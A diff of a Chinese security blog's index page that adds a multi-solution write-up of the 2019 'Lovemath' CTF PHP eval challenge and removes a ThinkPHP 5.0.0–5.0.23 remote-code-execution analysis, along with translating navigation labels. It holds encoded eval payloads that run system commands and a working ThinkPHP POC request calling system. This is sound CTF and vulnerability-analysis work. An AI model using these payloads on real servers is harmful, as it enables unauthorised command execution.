@@ -90,6 +90,85 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/"> 
+                    2019国赛Web线上题目Lovemath多解WP 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-04-23   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p>
+<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php 
+error_reporting(0); 
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag 
+if(!isset($_GET[&#39;c&#39;])){ 
+    show_source(__FILE__); 
+}else{ 
+    //例子 c=20-1 
+    $content = $_GET[&#39;c&#39;]; 
+    if (strlen($content) &gt;= 80) { 
+        die(&quot;太长了不会算&quot;); 
+    } 
+    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;]; 
+    foreach ($blacklist as $blackitem) { 
+        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) { 
+            die(&quot;请不要输入奇奇怪怪的字符&quot;); 
+        } 
+    } 
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 
+    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
+    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs); 
+    foreach ($used_funcs[0] as $func) { 
+        if (!in_array($func, $whitelist)) { 
+            die(&quot;请不要输入奇奇怪怪的函数&quot;); 
+        } 
+    } 
+    //帮你算出答案 
+    eval(&#39;echo &#39;.$content.&#39;;&#39;); 
+
+}</code></pre>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p>
+<p>也就是说只允许Eval使用白名单的函数做字符串</p>
+<p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p>
+<p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p>
+<p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p>
+<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p>
+<pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))
+$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p>
+<pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p>
+<pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p>
+<p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p>
+<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p>
+<pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p>
+<p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p>
+<h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p>
+<pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p>
+<p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/04/08/西湖论剑2019-Writeup/"> 
                     西湖论剑2019-Writeup 
                 </a>
@@ -192,7 +271,7 @@ with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:
             </div>
             <div class="continue">
             <a href="/2019/04/08/西湖论剑2019-Writeup/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -287,7 +366,7 @@ imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;
             </div>
             <div class="continue">
             <a href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -381,7 +460,7 @@ chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关�
             </div>
             <div class="continue">
             <a href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -425,7 +504,7 @@ chrome_options.add_argument(&#39;--no-sandbox&#39;) </code></pre><h1 id="相关�
             </div>
             <div class="continue">
             <a href="/2019/03/25/0CTF2019-Web1WriteUp/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -470,7 +549,7 @@ url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=
             </div>
             <div class="continue">
             <a href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -524,7 +603,7 @@ Location: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE
             </div>
             <div class="continue">
             <a href="/2019/02/14/Oauth2的两类漏洞挖掘/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -861,7 +940,7 @@ function make_var($val)
             </div>
             <div class="continue">
             <a href="/2019/02/02/Echsop2.7.x几处漏洞分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1047,7 +1126,7 @@ Route::set(&#39;index&#39;,function(){
             </div>
             <div class="continue">
             <a href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1215,231 +1294,7 @@ volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中
             </div>
             <div class="continue">
             <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/"> 
-                    ThinkPHP5.0.0~5.0.23RCE漏洞分析 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-01-20   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p>
-<h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p>
-<p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p>
-<p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p>
-<p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p>
-<pre><code>switch (self::$dispatch[&#39;type&#39;]) {
-    case &#39;redirect&#39;:
-        header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]);
-        break;
-
-    case &#39;module&#39;:
-       $data = self::module(self::$dispatch[&#39;module&#39;], $config);
-        break;
-
-    case &#39;controller&#39;:
-        $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]);
-        break;
-
-    case &#39;method&#39;:
-        $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]);
-        break;
-
-    case &#39;function&#39;:
-        $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]);
-        break;
-
-    default:
-        throw new Exception(&#39;dispatch type not support&#39;, 10008);
-}</code></pre><p>5、执行处理，返回输出。</p>
-<p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p>
-<p>所以核心操作就是调度请求。</p>
-<h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha
-
-POST:
-_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p>
-<pre><code>&lt;?php
-/**
-* 执行应用程序
-* @access public
-* @param  Request $request 请求对象
-* @return Response
-* @throws Exception
-*/
-public static function run(Request $request = null)
-{
-    $request = is_null($request) ? Request::instance() : $request;
-
-    try {
-        ...
-        // 获取应用调度信息
-        $dispatch = self::$dispatch;
-
-        // 未设置调度信息则进行 URL 路由检测
-        if (empty($dispatch)) {
-            $dispatch = self::routeCheck($request, $config);
-        }
-        ...
-
-        $data = self::exec($dispatch, $config);
-    } catch (HttpResponseException $exception) {
-        ...
-    }
-    ...
-}</code></pre><p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p>
-<pre><code>&lt;?php
-/**
-    * 当前的请求类型
-    * @access public
-    * @param bool $method  true 获取原始请求类型
-    * @return string
-    */
-public function method($method = false)
-{
-    if (true === $method) {
-        // 获取原始请求类型
-        return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
-    } elseif (!$this-&gt;method) {
-        if (isset($_POST[Config::get(&#39;var_method&#39;)])) {
-            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
-            $this-&gt;{$this-&gt;method}($_POST);
-        } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {
-            $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);
-        } else {
-            $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
-        }
-    }
-    return $this-&gt;method;
-}</code></pre><p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p>
-<p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p>
-<pre><code>&lt;?php
-protected function __construct($options = [])
-{
-    foreach ($options as $name =&gt; $item) {
-        if (property_exists($this, $name)) {
-            $this-&gt;$name = $item;
-        }
-    }
-    if (is_null($this-&gt;filter)) {
-        $this-&gt;filter = Config::get(&#39;default_filter&#39;);
-    }
-
-    // 保存 php://input
-    $this-&gt;input = file_get_contents(&#39;php://input&#39;);
-}</code></pre><p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p>
-<p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p>
-<p>request对象差不多清楚了，跟进self::routeCheck()</p>
-<pre><code>&lt;?php
-/**
- * URL路由检测（根据PATH_INFO)
- * @access public
- * @param  \think\Request $request 请求实例
- * @param  array          $config  配置信息
- * @return array
- * @throws \think\Exception
- */
-public static function routeCheck($request, array $config)
-{
-    $path   = $request-&gt;path();  //path=captcha
-    $depr   = $config[&#39;pathinfo_depr&#39;];
-    $result = false;
-
-    // 路由检测（根据路由定义返回不同的URL调度）
-    $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
-
-    return $result;</code></pre><p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p>
-<p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p>
-<pre><code>&lt;?php
-protected static function exec($dispatch, $config)
-{
-    switch ($dispatch[&#39;type&#39;]) {
-        ...
-        case &#39;method&#39;: // 回调方法
-            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
-            $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
-            break;
-        ...
-    }
-    return $data;
-}</code></pre><p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p>
-<pre><code>&lt;?php
-public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-{
-    if (empty($this-&gt;mergeParam)) {
-        $method = $this-&gt;method(true);
-        ...
-    }
-    ...
-    // 当前请求参数和URL地址中的参数合并
-    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
-    $this-&gt;mergeParam = true;
-    ...
-    return $this-&gt;input($this-&gt;param, $name, $default, $filter);
-}</code></pre><p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p>
-<p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p>
-<pre><code>&lt;?php
-public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-{
-    ...
-    // 解析过滤器
-    $filter = $this-&gt;getFilter($filter, $default);
-    if (is_array($data)) {
-        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
-        reset($data);
-    }
-    ...
-}</code></pre><p>跟进getFilter</p>
-<pre><code>protected function getFilter($filter, $default)
-{
-    if (is_null($filter)) {
-        $filter = [];
-    } else {
-        $filter = $filter ?: $this-&gt;filter;
-        if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) {
-            $filter = explode(&#39;,&#39;, $filter);
-        } else {
-            $filter = (array) $filter;
-        }
-    }
-
-    $filter[] = $default;
-    return $filter;
-}</code></pre><p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p>
-<p>从而调用call_user_func进行RCE</p>
-<h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p>
-<p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
-<li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li>
-<li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li>
-<li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li>
-<li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li>
-</ol>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1447,7 +1302,7 @@ public function input($data = [], $name = &#39;&#39;, $default = null, $filter =
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
     </main>
